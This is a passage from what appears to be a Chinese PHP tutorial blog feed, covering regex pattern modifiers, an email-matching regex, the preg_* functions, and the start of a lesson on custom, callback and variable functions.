class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(2) <span class="string">&quot;a9&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>哦耶！匹配成功了。/^a\d+/ 匹配的内容是a9，必须得在行开始处。在第二行也被匹配成功了。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. s 视为一行</strong></font><br>如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。<br></font><br>第一次，不加模式匹配符s：<font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/新的未来.+\d+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;新的未来</span></span><br><span class="line"><span class="string">987654321&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>第二次，在正则表达示后面加上模式匹配符s:<font color="#FF6347">(2)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/新的未来.+\d+/s&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;新的未来</span></span><br><span class="line"><span class="string">987654321&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(22) <span class="string">&quot;新的未来 987654321&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：</p>
</blockquote>
<ol>
<li>因为在新的未来，未来后面有一个换行</li>
<li>而.(点)是匹配非空白字符以外的所有字符。因此，第一次不成功</li>
<li>第二次，加上了s模式匹配符。因为，加上后.（点）能匹配所有字符。</li>
</ol>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. x 忽略空白字符</strong></font></p>
<ol>
<li>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略。</li>
<li>未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。</font>

</li>
</ol>
<ul>
<li><font color="#FF6347">(1)↓↓</font>我们先来实验一下忽略空白行等特性：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/a b c /x&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;学英语要从abc开始&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(3) <span class="string">&quot;abc&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这样也能匹配成功。<br>在$pattern里面有空格，每个abc后面有一个空格。而$string里面没有空格。<br>所以x忽略空白字符。</p>
</blockquote>
<ul>
<li><font color="#FF6347">(2)↓↓</font>而第二句话从字面上比较难理解：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//重点观察这一行</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/a b c #我来写一个注释</span></span><br><span class="line"><span class="string">/x&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;学英语要从abc开始&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(3) <span class="string">&quot;abc&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结果也匹配成功了！<br>我们发现，<font color="red">x的第二个特性是忽略：#字符和下一个换行符之间的字符也被忽略</font>。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. e 将匹配项找出来，进行替换</strong></font><br>e模式也叫逆向引用。主要的功能是将正则表达式括号里的内容取出来，放到替换项里面替换原字符串。<br>使用这个模式匹配符前必须要使用到<font color="#00B2EE"><strong>preg_replace()</strong></font>。<br><font color="red"><strong>mixed preg_replace ( mixed $正则表达式 , mixed $用于取代字符串的字串 , mixed $目标字符串)</strong></font><br><strong>preg_replace的功能：</strong>使用正则表达式 ，找到目标字符串。然后用’用于取代字符串的字串’进行替换。<br></font></p>
<p>在正式讲解前我们回顾一下之前的知识，我们故意的把每个要匹配的原子外面都加上括号：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//加上了括号</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(\d+)([a-z]+)(\d+)/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;987abc321&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(4) &#123; [0]=&gt; string(9) <span class="string">&quot;987abc321&quot;</span> [1]=&gt; string(3) <span class="string">&quot;987&quot;</span> [2]=&gt; string(3) <span class="string">&quot;abc&quot;</span> [3]=&gt; string(3) <span class="string">&quot;321&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这是我们之前讲括号的时候：匹配到的内容外面有括号。会把括号里面的内容，也放到数组的元素里面。如图中的：987、abc、321。</p>
</blockquote>
<p>&emsp;<br>我们接下来看正则表达示中的e模式：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;&#123;April 15, 2003&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="string">&#x27;w&#x27;</span>匹配字母，数字和下划线，<span class="string">&#x27;d&#x27;</span>匹配0-99数字，<span class="string">&#x27;+&#x27;</span>元字符规定其前导字符必须在目标对象中连续出现一次或多次</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;/&#123;(\w+) (\d+), (\d+)&#125;/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$replacement</span> = <span class="string">&quot;\$2&quot;</span>;</span><br><span class="line"></span><br><span class="line">//字符串被替换为与第 n 个被捕获的括号内的子模式所匹配的文本</span><br><span class="line"><span class="built_in">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">15</span><br></pre></td></tr></table></figure>

<blockquote>
</blockquote>
<p>结论：</p>
<ol>
<li>上例中$2 指向的是正则表达示的第一个(\d+)。相当于把15又取出来了</li>
<li>替换的时候，我写上$2。将匹配项取出来，用来再次替换匹配的结果。</li>
</ol>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. U 贪婪模式控制</strong></font><br>正则表达式默认是贪婪的，也就是尽可能的最大限度匹配。<br></font></p>
<p>我们来看看正则表达示是如何贪婪的：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/&lt;div&gt;.*&lt;\/div&gt;/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;&lt;div&gt;你好&lt;/div&gt;&lt;div&gt;我是&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(34) <span class="string">&quot;</span></span><br><span class="line"><span class="string">你好</span></span><br><span class="line"><span class="string">我是</span></span><br><span class="line"><span class="string">&quot;</span> &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们来看看结果，得到如下结论。它从“<br>你好”直接匹配到了“我是<br>”。进行了最大范围的匹配。</p>
</blockquote>
<p>&emsp;<br>同样一段代码我们再加大写的U，再看看效果：<font color="#FF6347">↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/&lt;div&gt;.*&lt;\/div&gt;/U&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;&lt;div&gt;你好&lt;/div&gt;&lt;div&gt;我是&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(17) <span class="string">&quot;</span></span><br><span class="line"><span class="string">你好</span></span><br><span class="line"><span class="string">&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们发现，只匹配出来了：&lt;div&gt;你好&lt;/div&gt;<br>这样，把正则的贪婪特性取消掉。让它找到了最近的匹配，就OK了。</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. A 从目标字符串的开头开始匹配</strong></font><br>此模式类似于元字符中的^（抑扬符）效果。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/this/A&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;hello this is a &#x27;</span>;</span><br><span class="line">//<span class="variable">$string1</span> = <span class="string">&#x27;this is a &#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>   1.如果加A模式修正符的时候匹配不出来$string，不加时能匹配出来<br>   2.如果加上了A模式修正符的时候能匹配出来$string1,因为必须要从开始处开始匹配</p>
</blockquote>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. D 结束$符后不准有回车</strong></font><br>如果设定了此修正符，模式中的美元元字符仅匹配目标字符串的结尾。没有此选项时，如果最后一个字符是换行符的话，美元符号也会匹配此字符之前。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\w+this$/&#x27;</span>; </span><br><span class="line"><span class="variable">$pattern1</span> = <span class="string">&#x27;/\w+this$/D&#x27;</span>; </span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;hellothis &quot;</span>; </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$pattern1</span>, <span class="variable">$string</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>; </span><br><span class="line">var_dump(<span class="variable">$match</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>结论：</strong><br>1.如pattern 在匹配$string的时候，$string的字符串this后有一个回车。在没有加D匹配符的时候也能匹配成功<br>2.如pattern 在匹配$string的时候，加上了D。$string的字符串this后有空格，匹配不成功。</p>
</blockquote>
<p>&emsp;</p>
<h3 id="7-写正则的诀窍和常用正则"><a href="#7-写正则的诀窍和常用正则" class="headerlink" title="7. 写正则的诀窍和常用正则"></a><font face="Comic sans MS"  color="#FF6347">7. 写正则的诀窍和常用正则</font></h3><p><font face="Comic sans MS">写正则的诀窍</font><br>女孩和男孩恋爱时的诀窍通常是：测试你是不是对我好一点，如果是的，咱们的关系就更好一点。<br>而正则的诀窍和恋爱的诀窍基本一致：<font color="red">写一点、测一点。</font><br>因为，<strong>我们需要不断的正则，用preg_match对比是不是能匹配成功。成功了，再写后面的一点。直到写完，全部匹配成功为止！</strong><br><font face="Comic sans MS">例如，我要写一个邮箱的正则。我先要做的事情，将常用的邮箱格式全部列出来。例如：<br><a href="mailto:&#112;&#x68;&#112;&#x63;&#110;&#64;&#112;&#104;&#112;&#46;&#x63;&#110;">&#112;&#x68;&#112;&#x63;&#110;&#64;&#112;&#104;&#112;&#46;&#x63;&#110;</a> &emsp; <a href="mailto:&#112;&#x68;&#x70;&#99;&#110;&#x40;&#x63;&#111;&#114;&#112;&#x2e;&#x62;&#97;&#x69;&#x64;&#x75;&#x2e;&#99;&#109;">&#112;&#x68;&#x70;&#99;&#110;&#x40;&#x63;&#111;&#114;&#112;&#x2e;&#x62;&#97;&#x69;&#x64;&#x75;&#x2e;&#99;&#109;</a> &emsp; <a href="mailto:&#x70;&#x68;&#112;&#99;&#110;&#64;&#49;&#50;&#x36;&#x2e;&#x63;&#x6f;&#109;">&#x70;&#x68;&#112;&#99;&#110;&#64;&#49;&#50;&#x36;&#x2e;&#x63;&#x6f;&#109;</a>  &emsp;<a href="mailto:&#112;&#x68;&#112;&#99;&#x6e;&#64;&#x78;&#x78;&#120;&#x2e;&#99;&#x6f;&#109;">&#112;&#x68;&#112;&#99;&#x6e;&#64;&#x78;&#x78;&#120;&#x2e;&#99;&#x6f;&#109;</a>  &emsp;<a href="mailto:&#49;&#50;&#x33;&#52;&#53;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#109;">&#49;&#50;&#x33;&#52;&#53;&#64;&#x71;&#113;&#46;&#99;&#x6f;&#109;</a><br></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">  常用的格式主要有这样一些。那我们就可以来分析：
    1.先匹配@之前的字符 \w+（因为是0-9A-Za-z_）
    2.第二个跟一个@符
    3.第三个再写上[a-zA-Z0-9-]+ 因为qq和126这些主域名是不能有下划线的
    4.corp.baidu. 或者是126. 通常邮箱后缀都是这样的。所以我们可以写成：([a-zA-Z0-9-]+.){1,2}
    5.上面的是将 **.** 转义，让它是本身的意思。括号重复的区间最少一次，最多两次。
    6.后面接下com|cn|org|gov.cn|net|edu.cn等就可以了
</font></td></tr></table>

<p>因此，我们的正则表达式我使用：<br>/\w+@([a-zA-Z0-9-]+.){1,2}(com|cn|org|gov.cn|net|edu.cn)/<br>或<br>/\w+@([a-zA-Z0-9_]+)\.(com|cn|org|gov.cn|net|edu.cn)/<br>邮箱的正则就被我写成功了。ฅʕ•̫͡•ʔฅ</p>
<p>&emsp;</p>
<h3 id="8-常用正则函数"><a href="#8-常用正则函数" class="headerlink" title="8. 常用正则函数"></a><font face="Comic sans MS" color="#FF6347">8. 常用正则函数</font></h3><table>
<thead>
<tr>
<th align="center">函数名</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">preg_filter</td>
<td align="left">执行一个正则表达式搜索和替换</td>
</tr>
<tr>
<td align="center">preg_grep</td>
<td align="left">返回匹配模式的数组条目</td>
</tr>
<tr>
<td align="center">preg_match</td>
<td align="left">执行一个正则表达式匹配</td>
</tr>
<tr>
<td align="center">preg_match_all</td>
<td align="left">执行一个全局正则表达式匹配</td>
</tr>
<tr>
<td align="center">preg_replace_callback_array</td>
<td align="left">传入数组，执行一个正则表达式搜索和替换使用回调</td>
</tr>
<tr>
<td align="center">preg_replace_callback</td>
<td align="left">执行一个正则表达式搜索并且使用一个回调进行替换</td>
</tr>
<tr>
<td align="center">preg_replace</td>
<td align="left">执行一个正则表达式的搜索和替换</td>
</tr>
<tr>
<td align="center">preg_split</td>
<td align="left">通过一个正则表达式分隔字符串</td>
</tr>
</tbody></table>
<p>&emsp;<br><strong>正则关于面试常遇到的问题</strong><br>面试中经常考到的几个正则达达示是：</p>
<ol>
<li>匹配邮箱</li>
<li>匹配手机号</li>
<li>匹配一个网址</li>
<li>用正则匹配某个格式，取出某个例</li>
<li>写一个采集器<br>其他….</li>
</ol>
<p>面试的第4题和第5题我对大家不担心，因为只要大家认真学习了我给的前五节的内容。第4，5题推理就行。<br>因为，通常在技术答题面试环节，是时候准许查手机的！  ヾ(๑╹◡╹)ﾉ”</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-函数</title>
    <url>/post/PHP-function/</url>
    <content><![CDATA[<p>PHP函数分为<font color="red"><strong>自定义函数</strong></font>和<font color="red"><strong>系统函数</strong></font> (oﾟvﾟ)ノ</p>
<a id="more"></a>

<p>&ensp;<br>&ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 函数</font></center>


<p>&emsp;<br>&emsp;</p>
<h3 id="一-自定义函数"><a href="#一-自定义函数" class="headerlink" title="一. 自定义函数"></a><font color="#FF6347" face="Comic sans MS">一. 自定义函数</font></h3><h4 id="1-1-自定义函数函数基本概念"><a href="#1-1-自定义函数函数基本概念" class="headerlink" title="1.1 自定义函数函数基本概念"></a><font color="#3CB371" face="Comic sans MS">1.1 自定义函数函数基本概念</font></h4><p><font face="Comic sans MS">我们在实际开发过程当中需要有很多功能都需要反复使用到，而这些反复需要使用到的功能，我们能定义成功能（函数），就尽可能定义成功能（函数）。使用的时候，吼一下它的名字即可。<br>  那我们来学一下自定义函数的语法规定，语法规定如下：<br><font color="red"><br>  function 函数名([参数名1[=值1], 参数名2[=值2], 参数名n[=值n]])<br>{<br>       函数中的功能体<br>    [return 返回值]<br>}<br></font><br></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**上面的语法规定中发现了如下特点，产生如下语未能规定：**</font>
1. 函数以<font color="red">**function**</font>开始
2. function后面接空格，空格后接函数名
3. 函数名与变量命名规则基本一样，但是不同的是：<font color="red">**函数名不区分大小写**</font>
4. 所谓参数其实就是变量
5. 函数名后接括号，括号内跟参数，参数全都有[]（中括号）括起来了，代表参数可填可不填
6. 如果有参数的话，参数后可以接(＝)等号，等号接默认值。参数值也是用[](中括号)括起来的，代表选填
7. 函数后的参数变量，主要功能是把函数体外的变量值，传入函数体内来使用，函数体的变量和函数体外的
   变量通常是两个不同的变量。
8. 函数中的具体功能（功能体）用大括号括起来，代表这是一个函数的功能区间
9. 函数可以有返回值也可以没有返回值，用[]（中括号）括起来的，代表选填。
10. return后接空格，空格后接返回值，若有return,return后的代码均不执行。(<font color="red">**return可用可不用**</font>)
11. 函数的执行没有顺序关系，可以在定义处之前的位置调用
12. 函数不能被定义两次，即函数不能被重载
</font></td></tr></table>

<p>&emsp;</p>
<blockquote>
<p><font color="#00B2EE"><strong>1. 函数是条狗，哪里调用哪里哪，它就跟着你走</strong></font><br><font color="#00B2EE"><strong>2. 函数名只能是字母，数字，下划线的组合，并且之间不能包含空格，数字不能放在变量名首位。</strong></font><br><font color="#00B2EE"><strong>3. 函数名与变量命名规则一样，但是不同的是：</strong><font color="red"><strong>函数名不区分大小写</strong></font> </font><br><font color="#00B2EE"><strong>4. 函数体的参数若是定义了，未传参数，代码会报错</strong></font><br><font color="#00B2EE"><strong>5. 函数的参数如果有默认值，参数可以不填，代码也不会报错</strong></font><br><font color="#00B2EE"><strong>6. 函数的参数可以写多个</strong></font><br><font color="#00B2EE"><strong>7. 函数如果有默认值和无默认值的参数，通常把无默认值的参数写在最前面</strong></font><br><font color="#00B2EE"><strong>8. 函数体的变量与函数体外的变量没有关系</strong></font><br><font color="#00B2EE"><strong>9. 函数体中若有return,return 后的代码不执行</strong></font><br><font color="#00B2EE"><strong>10. 函数执行完后,return 可把函数体内的值，带带函数体外</strong></font><br><font color="#00B2EE"><strong>11. 函数的执行没有顺序关系，可以在定义处之前的位置调用</strong></font><br><font color="#00B2EE"><strong>12. 函数不能重载</strong></font></p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-2-回调函数"><a href="#1-2-回调函数" class="headerlink" title="1.2 回调函数"></a><font color="#3CB371" face="Comic sans MS">1.2 回调函数</font></h4><p><strong>一个函数作为另外一个函数的</strong><font color="red"><strong>参数</strong></font>。</p>
<p><font face="Comic sans MS">回调函数，可以配合匿名函数和变量函数实现更加优美、复杂的一种函数结构。<br>回调函数，就是在处理一个功能的时候，我让让这个功能自定义能力再强一些，我准许调用这个函数的时候，还可以传入一个函数配合、协助进行处理。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> woziji(<span class="variable">$one</span>,<span class="variable">$two</span>,<span class="variable">$func</span>)&#123;</span><br><span class="line">       //我规定：检查<span class="variable">$func</span>是否是函数，如果不是函数停止执行本段代码，返回<span class="literal">false</span></span><br><span class="line">       <span class="keyword">if</span>(!is_callable(<span class="variable">$func</span>))&#123;</span><br><span class="line">               <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       //我把<span class="variable">$one</span>、<span class="variable">$two</span>相加，再把<span class="variable">$one</span>和<span class="variable">$two</span>传入<span class="variable">$func</span>这个函数中处理一次</span><br><span class="line">       //<span class="variable">$func</span>是一个变量函数，参见变量函数这一章</span><br><span class="line">       <span class="built_in">echo</span> <span class="variable">$one</span> + <span class="variable">$two</span> + <span class="variable">$func</span>(<span class="variable">$one</span>,<span class="variable">$two</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//我们定义几个函数试试</span><br><span class="line"><span class="keyword">function</span> plusx2( <span class="variable">$foo</span> , <span class="variable">$bar</span>)&#123;</span><br><span class="line">       <span class="variable">$result</span> = (<span class="variable">$foo</span>+<span class="variable">$bar</span>)*2;</span><br><span class="line">       <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> jian( <span class="variable">$x</span> , <span class="variable">$y</span> )&#123;</span><br><span class="line">   <span class="variable">$result</span> = <span class="variable">$x</span> - <span class="variable">$y</span>;</span><br><span class="line">   <span class="built_in">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line">//调用一下函数，woziji，向里面传入参数试试</span><br><span class="line"><span class="built_in">echo</span> woziji(20,10,<span class="string">&#x27;plusx2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">//将plusx2改成jian试试结果</span><br><span class="line"><span class="built_in">echo</span> woziji(20,10,<span class="string">&#x27;jian&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>处理过程是这样的:</strong><br>    1.将20赋值给形参$one,10赋值给了$two，而plusx2或者jian这两个变量函数，赋值给了$func<br>    2.在woziji这个函数中判断plusx2或者jian是否为函数，不是函数就return false 停止执行了<br>    3.显示plusx2或者jian是函数。因此$one = 20, $two =10相加了，相加后，$one和$two又带入到了了$func($one,$two)中。<br>    4.带入至里面后而$func，是可变的，可以为plusx2或者jian。如果为plusx2的话，$one = 20,$two = 10 的这个两个结果又给        了plusx2函数里面的$foo和$bar<br>    5.$foo + $bar 乘以2后将结果返回至woziji这个函数功能体的运算处：$one + $two + $func($one,$two);<br>    6.这样得到了运算结果<br>现在我们明白了回调函数：在一个调数里面，再传入一个函数名，将函数名加上()括号。识为变量函数，配合执行。</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-3-变量函数"><a href="#1-3-变量函数" class="headerlink" title="1.3 变量函数"></a><font color="#3CB371" face="Comic sans MS">1.3 变量函数</font></h4><p><font color="red"><strong>function demo(){}<br>$fu = ‘demo’;<br>$fu();</strong><br></font></p>
<p>&emsp;<br><font face="Comic sans MS">在之前的变量部份，我们学习了可变变量。可变函数仅仅是可变变量的一个变种、变形表达。<br><font color="#00B2EE"><strong>可变函数</strong></font>，我们也会称呼为变量函数。简单回顾一下之前的知识点：<br></font></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$hello = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">$world = <span class="string">&#x27;你好&#x27;</span>;</span><br><span class="line"><span class="comment">//输出的结果为：你好</span></span><br><span class="line"><span class="keyword">echo</span> $$hello; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为$hello先被解释成了world，再world前加上$符就输出了：你好。</p>
</blockquote>
<p>&emsp;<br>而<font color="#00B2EE"><strong>变量函数</strong></font>的用法是这样的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">demo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;天王盖地虎&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;小鸡炖蘑菇&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$fu = <span class="string">&#x27;demo&#x27;</span>;</span><br><span class="line"><span class="comment">//把$fu变为了demo,把demo后加上了一个括号，就执行函数了</span></span><br><span class="line">$fu();</span><br><span class="line"><span 